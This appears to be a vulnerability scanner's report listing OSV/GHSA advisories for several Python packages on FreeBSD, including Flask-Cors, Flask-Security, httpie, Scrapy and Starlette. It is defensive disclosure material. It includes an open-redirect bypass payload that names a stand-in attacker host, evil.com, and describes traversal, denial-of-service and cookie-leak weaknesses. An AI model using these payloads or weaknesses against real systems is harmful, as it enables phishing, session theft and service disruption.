>>> for version 1.9.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-Flask-Cors-3.0.8' / PIP's package 'Flask-Cors-3.0.8' is vulnerable:
    Id:        PYSEC-2020-43
    Aliases:   ['CVE-2020-25032', 'GHSA-xc3p-ff3m-f46v']
    Details:   An issue was discovered in Flask-CORS (aka CORS Middleware for Flask) before 3.0.9. It allows ../ directory traversal to access private resources because resource matching does not ensure that pathnames are in a canonical format.
    Fixed in:  ['3.0.9']
    Link:      https://osv.dev/vulnerability/PYSEC-2020-43
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-xc3p-ff3m-f46v
    Aliases:   ['CVE-2020-25032']
    Details:   An issue was discovered in Flask-CORS (aka CORS Middleware for Flask) before 3.0.9. It allows ../ directory traversal to access private resources because resource matching does not ensure that pathnames are in a canonical format.
    Fixed in:  ['3.0.9']
    Link:      https://osv.dev/vulnerability/GHSA-xc3p-ff3m-f46v
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 3.0.8 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-flask-security-3.0.0_1' / PIP's package 'flask-security-3.0.0' is vulnerable:
    Id:        GHSA-cg8c-gc2j-2wf7
    Aliases:   ['CVE-2021-23385']
    Details:   This affects all versions of package Flask-Security. When using the `get_post_logout_redirect` and `get_post_login_redirect` functions, it is possible to bypass URL validation and redirect a user to an arbitrary URL by providing multiple back slashes such as `\\\evil.com/path`. This vulnerability is only exploitable if an alternative WSGI server other than Werkzeug is used, or the default behaviour of Werkzeug is modified using `'autocorrect_location_header=False`.

**Note:** Flask-Security is not maintained anymore.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/GHSA-cg8c-gc2j-2wf7
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 3.0.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-httpie-3.0.2' / PIP's package 'httpie-3.0.2' is vulnerable:
    Id:        PYSEC-2022-34
    Aliases:   ['CVE-2022-24737', 'GHSA-9w4w-cpc8-h2fq']
    Details:   HTTPie is a command-line HTTP client. HTTPie has the practical concept of sessions, which help users to persistently store some of the state that belongs to the outgoing requests and incoming responses on the disk for further usage. Before 3.1.0, HTTPie didnâ€˜t distinguish between cookies and hosts they belonged. This behavior resulted in the exposure of some cookies when there are redirects originating from the actual host to a third party website. Users are advised to upgrade. There are no known workarounds.
    Fixed in:  ['3.1.0']
    Link:      https://osv.dev/vulnerability/PYSEC-2022-34
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2022-167
    Aliases:   ['CVE-2022-0430', 'GHSA-6pc9-xqrg-wfqw']
    Details:   Exposure of Sensitive Information to an Unauthorized Actor in GitHub repository httpie/httpie prior to 3.1.0.
    Fixed in:  ['3.1.0']
    Link:      https://osv.dev/vulnerability/PYSEC-2022-167
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-9w4w-cpc8-h2fq
    Aliases:   ['CVE-2022-24737']
    Details:   ### Impact
HTTPie have the practical concept of [sessions](https://httpie.io/docs/cli/sessions), which help users to persistently store some of the state that belongs to the outgoing requests and incoming responses on the disk for further usage. As an example, we can make an authenticated request and save it to a [named session](https://httpie.io/docs/cli/named-sessions) called `api`:

```bash
$ http --session api -a user:pass pie.dev/basic-auth/user/pass
```

```json
{
    "authenticated": true,
    "user": "user"
}
```

Since we have now saved the authentication data to that session, we won‘t have to enter it again and again on every invocation. We can simply reference the session, and HTTPie will use the saved state directly from it:

```bash
$ http --session api pie.dev/basic-auth/user/pass
```

```json
{
    "authenticated": true,
    "user": "user"
}
```

One particular use case of these sessions is storing cookies (commonly referred to as a `Cookie Jar`). If a response has a `Set-Cookie`
header, HTTPie will parse it and store the actual cookie in the session. And from that point on, all outgoing requests will attach that cookie (in the form of a `Cookie` header).

This is extremely useful, especially when you are dealing with websites which manage their own state on the client-side through cookies.

```bash
$ http -F --session jar pie.dev/cookies/set/x/y
```

```json
{
    "cookies": {
        "x": "y"
    }
}
```

Before `3.1.0`, HTTPie didn‘t distinguish between cookies and hosts they belonged. This behavior resulted in the exposure of some cookies when there are redirects originating from the actual host to a third party website, e.g:

```bash
$ http -F --session jar pie.dev/redirect-to url==https://httpbin.org/cookies
```

(Pre 3.1.0)
```json
{
    "cookies": {
        "x": "y"
    }
}
```

(Post 3.1.0)
```json
{
    "cookies": {}
}
```

This behavior has been corrected in this release (with taking [RFC 6265 — HTTP State Management Mechanism](https://datatracker.ietf.org/doc/html/rfc6265) into the consideration).

A huge credit goes to [@Glyph](https://github.com/glyph) for disclosing the original vulnerability to us (through [huntr.dev](http://huntr.dev/)).

### Patches
We suggest users to upgrade their HTTPie version to `3.1.0` or higher, and run `httpie cli sessions upgrade` command on their sessions.

### For more information
If you have any questions or comments about this advisory:
* Email us: [`security@httpie.io`](mailto:security@httpie.io)

> Please note that this entry is covered by both [CVE-2022-24737](https://www.cvedetails.com/cve/CVE-2022-24737) and [CVE-2022-0430](https://nvd.nist.gov/vuln/detail/CVE-2022-0430).

    Fixed in:  ['3.1.0']
    Link:      https://osv.dev/vulnerability/GHSA-9w4w-cpc8-h2fq
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-6pc9-xqrg-wfqw
    Aliases:   ['CVE-2022-0430']
    Details:   httpie is a modern, user-friendly command-line HTTP client for the API era. Prior to version 3.1.0, all cookies saved to session storage are supercookies. At this time, there is no known workaround. Users are recommended to update to version 3.1.0.
    Fixed in:  ['3.1.0']
    Link:      https://osv.dev/vulnerability/GHSA-6pc9-xqrg-wfqw
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 3.0.2 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-httpx013-0.13.3_3' / PIP's package 'httpx-0.13.3' is vulnerable:
    Id:        PYSEC-2022-183
    Aliases:   ['CVE-2021-41945', 'GHSA-h8pj-cxx2-jfg2']
    Details:   Encode OSS httpx <=1.0.0.beta0 is affected by improper input validation in `httpx.URL`, `httpx.Client` and some functions using `httpx.URL.copy_with`.
    Fixed in:  ['0.20.0']
    Link:      https://osv.dev/vulnerability/PYSEC-2022-183
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-h8pj-cxx2-jfg2
    Aliases:   ['CVE-2021-41945']
    Details:   Encode OSS httpx <=1.0.0.beta0 is affected by improper input validation in `httpx.URL`, `httpx.Client` and some functions using `httpx.URL.copy_with`.
    Fixed in:  ['0.23.0']
    Link:      https://osv.dev/vulnerability/GHSA-h8pj-cxx2-jfg2
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 0.13.3 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-Scrapy-2.5.1' / PIP's package 'Scrapy-2.5.1' is vulnerable:
    Id:        PYSEC-2017-83
    Aliases:   ['CVE-2017-14158', 'GHSA-h7wm-ph43-c39p']
    Details:   Scrapy 1.4 allows remote attackers to cause a denial of service (memory consumption) via large files because arbitrarily many files are read into memory, which is especially problematic if the files are then individually written in a separate thread to a slow storage resource, as demonstrated by interaction between dataReceived (in core/downloader/handlers/http11.py) and S3FilesStore.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/PYSEC-2017-83
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2022-159
    Aliases:   ['CVE-2022-0577', 'GHSA-cjvr-mfj7-j4j8']
    Details:   Exposure of Sensitive Information to an Unauthorized Actor in GitHub repository scrapy/scrapy prior to 2.6.1.
    Fixed in:  ['2.6.1']
    Link:      https://osv.dev/vulnerability/PYSEC-2022-159
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-mfjm-vh54-3f96
    Aliases:   []
    Details:   ### Impact

Responses from domain names whose public domain name suffix contains 1 or more periods (e.g. responses from `example.co.uk`, given its public domain name suffix is `co.uk`) are able to set cookies that are included in requests to any other domain sharing the same domain name suffix.

### Patches

Upgrade to Scrapy 2.6.0, which restricts cookies with their domain set to any of those in the [public suffix list](https://publicsuffix.org/).

If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.

### Workarounds

The only workaround for unpatched versions of Scrapy is to [disable cookies altogether](https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED), or [limit target domains](https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains) to a subset that does not include domain names with one of the public domain suffixes affected (those with 1 or more periods).

### References
* https://publicsuffix.org/

### For more information

If you have any questions or comments about this advisory:
* [Open an issue](https://github.com/scrapy/scrapy/issues)
* [Email us](mailto:opensource@zyte.com)

    Fixed in:  ['1.8.2', '2.6.0']
    Link:      https://osv.dev/vulnerability/GHSA-mfjm-vh54-3f96
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-cjvr-mfj7-j4j8
    Aliases:   ['CVE-2022-0577']
    Details:   ### Impact

If you manually define cookies on a [`Request`](https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request) object, and that `Request` object gets a redirect response, the new `Request` object scheduled to follow the redirect keeps those user-defined cookies, regardless of the target domain.

### Patches

Upgrade to Scrapy 2.6.0, which resets cookies when creating `Request` objects to follow redirects¹, and drops the ``Cookie`` header if manually-defined if the redirect target URL domain name does not match the source URL domain name².

If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.

¹ At that point the original, user-set cookies have been processed by the cookie middleware into the global or request-specific cookiejar, with their domain restricted to the domain of the original URL, so when the cookie middleware processes the new (redirect) request it will incorporate those cookies into the new request as long as the domain of the new request matches the domain of the original request.

² This prevents cookie leaks to unintended domains even if the cookies middleware is not used.

### Workarounds

If you cannot upgrade, set your cookies using a list of dictionaries instead of a single dictionary, as described in the [`Request` documentation](https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request), and set the right domain for each cookie.

Alternatively, you can [disable cookies altogether](https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED), or [limit target domains](https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains) to domains that you trust with all your user-set cookies.

### References
* Originally reported at [huntr.dev](https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585/)

### For more information

If you have any questions or comments about this advisory:
* [Open an issue](https://github.com/scrapy/scrapy/issues)
* [Email us](mailto:opensource@zyte.com)
    Fixed in:  ['1.8.2', '2.6.0']
    Link:      https://osv.dev/vulnerability/GHSA-cjvr-mfj7-j4j8
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-h7wm-ph43-c39p
    Aliases:   ['CVE-2017-14158']
    Details:   Scrapy 1.4 allows remote attackers to cause a denial of service (memory consumption) via large files because arbitrarily many files are read into memory, which is especially problematic if the files are then individually written in a separate thread to a slow storage resource, as demonstrated by interaction between dataReceived (in core/downloader/handlers/http11.py) and S3FilesStore.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/GHSA-h7wm-ph43-c39p
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-9x8m-2xpf-crp3
    Aliases:   []
    Details:   ### Impact

When the [built-in HTTP proxy downloader middleware](https://docs.scrapy.org/en/2.6/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpproxy) processes a request with `proxy` metadata, and that `proxy` metadata includes proxy credentials, the built-in HTTP proxy downloader middleware sets the `Proxy-Authentication` header, but only if that header is not already set.

There are third-party proxy-rotation downloader middlewares that set different `proxy` metadata every time they process a request.

Because of request retries and redirects, the same request can be processed by downloader middlewares more than once, including both the built-in HTTP proxy downloader middleware and any third-party proxy-rotation downloader middleware.

These third-party proxy-rotation downloader middlewares could change the `proxy` metadata of a request to a new value, but fail to remove the `Proxy-Authentication` header from the previous value of the `proxy` metadata, causing the credentials of one proxy to be leaked to a different proxy.

If you rotate proxies from different proxy providers, and any of those proxies requires credentials, you are affected, unless you are handling proxy rotation as described under **Workarounds** below. If you use a third-party downloader middleware for proxy rotation, the same applies to that downloader middleware, and installing a patched version of Scrapy may not be enough; patching that downloader middlware may be necessary as well.

### Patches

Upgrade to Scrapy 2.6.2.

If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.2 is not an option, you may upgrade to Scrapy 1.8.3 instead.

### Workarounds

If you cannot upgrade, make sure that any code that changes the value of the `proxy` request meta also removes the `Proxy-Authorization` header from the request if present.

### For more information

If you have any questions or comments about this advisory:
* [Open an issue](https://github.com/scrapy/scrapy/issues)
* [Email us](mailto:opensource@zyte.com)

    Fixed in:  ['1.8.3', '2.6.2']
    Link:      https://osv.dev/vulnerability/GHSA-9x8m-2xpf-crp3
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 2.5.1 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-starlette-0.23.1_1' / PIP's package 'starlette-0.23.1' is vulnerable:
    Id:        GHSA-74m5-2c7w-9w3x
    Aliases:   []
    Details:   ### Impact

The `MultipartParser` using the package `python-multipart` accepts an unlimited number of multipart parts (form fields or files).

Processing too many parts results in high CPU usage and high memory usage, eventually leading to an <abbr title="out of memory">OOM</abbr> process kill.

This can be triggered by sending too many small form fields with no content, or too many empty files.

For this to take effect application code has to:

* Have `python-multipart` installed and
* call `request.form()`
  * or via another framework like FastAPI, using form field parameters or `UploadFile` parameters, which in turn calls `request.form()`.

### Patches

The vulnerability is solved in Starlette 0.25.0 by making the maximum fields and files customizable and with a sensible default (1000). 

Applications will be secure by just upgrading their Starlette version to 0.25.0 (or FastAPI to 0.92.0).

If application code needs to customize the new max field and file number, there are new `request.form()` parameters (with the default values):

* `max_files=1000`
* `max_fields=1000`

### Workarounds

Applications that don't install `python-multipart` or that don't use form fields are safe.

In older versions, it's also possible to instead of calling `request.form()` call `request.stream()` and parse the form data in internal code.

In most cases, the best solution is to upgrade the Starlette version.

### References

This was reported in private by @das7pad via internal email. He also coordinated the fix across multiple frameworks and parsers.

The details about how `multipart/form-data` is structured and parsed are in the [RFC 7578](https://www.rfc-editor.org/rfc/rfc7578).

    Fixed in:  ['0.25.0']
    Link:      https://osv.dev/vulnerability/GHSA-74m5-2c7w-9w3x
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 0.23.1 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-treq-20.9.0' / PIP's package 'treq-20.9.0' is vulnerable:
    Id:        GHSA-fhpf-pp6p-55qc
    Aliases:   ['CVE-2022-23607']
    Details:   ### Impact

Treq's request methods (`treq.get`, `treq.post`, `HTTPClient.request`, `HTTPClient.get`, etc.) accept cookies as a dictionary, for example:

```py
treq.get('https://example.com/', cookies={'session': '1234'})
```

Such cookies are not bound to a single domain, and are therefore sent to *every* domain ("supercookies"). This can potentially cause sensitive information to leak upon an HTTP redirect to a different domain., e.g. should `https://example.com` redirect to `http://cloudstorageprovider.com` the latter will receive the cookie `session`.

### Patches

Treq 2021.1.0 and later bind cookies given to request methods (`treq.request`, `treq.get`, `HTTPClient.request`, `HTTPClient.get`, etc.) to the origin of the *url* parameter.

### Workarounds

Instead of passing a dictionary as the *cookies* argument, pass a `http.cookiejar.CookieJar` instance with properly domain- and scheme-scoped cookies in it:

```py
from http.cookiejar import CookieJar
from requests.cookies import create_cookie

jar = CookieJar()
jar.add_cookie(
    create_cookie(
        name='session',
        value='1234',
        domain='example.com',
        secure=True,
    ),
)
client = HTTPClient(cookies=jar)
client.get('https://example.com/')
```

### References

* Originally reported at [huntr.dev](https://huntr.dev/bounties/3c9204fc-a3d1-4441-8599-924c5f57e7ae/?token=06d930e37046c914bcb037e85cc227dc7b510b475989fc69837566562ba899277d46b0fb4b1e21cdcb6ddc1b7d9b1ded632cf3a3551ecb89afca16a63b34641284b50479d5195bba2ac09b116f3dd4fad27f54404c2de922c05c8c8b744aec27bb4d4d198cb8b3abf479af0c2d5fbaa10412da7922594ac3eb39)
* A related issue in the handling of HTTP basic authentication was addressed in Twisted 22.1 ([GHSA-92x2-jw7w-xvvx](https://github.com/twisted/twisted/security/advisories/GHSA-92x2-jw7w-xvvx), CVE-2022-21712).
    Fixed in:  ['22.1.0']
    Link:      https://osv.dev/vulnerability/GHSA-fhpf-pp6p-55qc
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 20.9.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-WsgiDAV-3.1.0' / PIP's package 'WsgiDAV-3.1.0' is vulnerable:
    Id:        GHSA-xx6g-jj35-pxjv
    Aliases:   ['CVE-2022-41905']
    Details:   ### Impact
Implementations using this library with directory browsing enabled may be susceptible to [Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) attacks.

### Patches
Users can upgrade to v4.1.0

### Workarounds
Set `dir_browser.enable = False` in the configuration. For instance, when using a Python dictionary to configure the library:

```
config = {
    # your normal configuration
    "dir_browser": {
      "enable": False
    },
}
app = WsgiDAVApp(config)
```

### For more information

Note that an attacker cannot exploit this vulnerability, by simply  uploading a file or folder with a manipulated file name.
However if the WsgiDAV library is used in a scenario where untrusted data is displayed in the directory browser's user interface (e.g. 'realm' or user name, ...) XSS may happen.

If you have any questions or comments about this advisory:
* Open an issue in [mar10/wsgidav](https://github.com/mar10/wsgidav/)
* See the [security policy](https://github.com/mar10/wsgidav/security/policy)

    Fixed in:  ['4.1.0']
    Link:      https://osv.dev/vulnerability/GHSA-xx6g-jj35-pxjv
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 3.1.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



